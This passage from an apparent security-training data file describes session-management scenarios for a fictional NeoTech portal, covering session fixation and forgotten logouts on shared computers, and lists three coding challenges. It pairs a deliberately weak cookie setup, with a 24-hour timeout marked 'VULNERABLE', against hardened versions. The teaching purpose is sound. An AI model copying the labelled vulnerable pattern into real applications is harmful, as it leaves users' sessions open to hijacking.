      code: `// SECURE - Always regenerate session ID
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Delete old session if exists
  if (req.cookies.sessionId) {
    await db.sessions.delete({ id: req.cookies.sessionId });
  }

  // ALWAYS generate new ID server-side
  const sessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({ id: sessionId, userId: user.id });
  res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });
  res.json({ success: true });
});`
    }
  },
  {
    id: 'scenario-3',
    title: 'The Forgotten Logout: Shared Computer Risk',
    threatLevel: 'LOW' as const,
    attack: `You log into NeoTech's portal at a public library. You finish your work, close the browser tab (but don't click "Logout"), and leave. The session cookie remains valid in the browser.`,
    exploitation: `The next person on that computer opens a new tab and navigates to neotech.com. The browser automatically sends your still-valid session cookie. The server validates it and grants access. They're now browsing as you, viewing your data, possibly making changes.`,
    defense: `Implement short idle timeouts (15-30 minutes). Use sliding expiration - extend timeout on activity, but not indefinitely. Offer "Logout all devices" feature. Educate users about public computer risks. Consider prompting "Are you on a public computer?" and offering single-session mode.`,
    vulnerableCode: {
      language: 'javascript' as const,
      label: 'Vulnerable Code',
      code: `// VULNERABLE - Long session timeout
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  maxAge: 24 * 60 * 60 * 1000  // 24 hours - TOO LONG!
});`
    },
    secureCode: {
      language: 'javascript' as const,
      label: 'Secure Code',
      code: `// SECURE - Short timeout with sliding expiration
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 60 * 1000  // 30 minutes - reasonable
});

// Middleware to update lastActivity
async function updateSessionActivity(req, res, next) {
  if (req.cookies.sessionId) {
    await db.sessions.update(
      { id: req.cookies.sessionId },
      { lastActivity: Date.now() }
    );
  }
  next();
}`
    }
  }
];

/**
 * Challenge exports with proper typing
 */
export const challenges = [
  {
    id: 'challenge-1',
    title: 'Decode the Breach',
    difficulty: 'Easy' as const,
    description: `You've intercepted a session cookie from a poorly secured application. Examine its attributes and identify the security vulnerabilities. Add the missing security flags to make it secure.`,
    points: 100
  },
  {
    id: 'challenge-2',
    title: 'Build the Fort',
    difficulty: 'Medium' as const,
    description: `Implement a complete, production-ready session creation flow. Your code must hash passwords, generate secure session IDs, store sessions, and set properly configured cookies.`,
    points: 250
  },
  {
    id: 'challenge-3',
    title: 'Hunt the Hacker',
    difficulty: 'Hard' as const,
    description: `This code has FIVE critical vulnerabilities that make it hackable. Find them all and patch each one. Vulnerabilities range from XSS exposure to session fixation to timing attacks.`,
    points: 500
  }
];
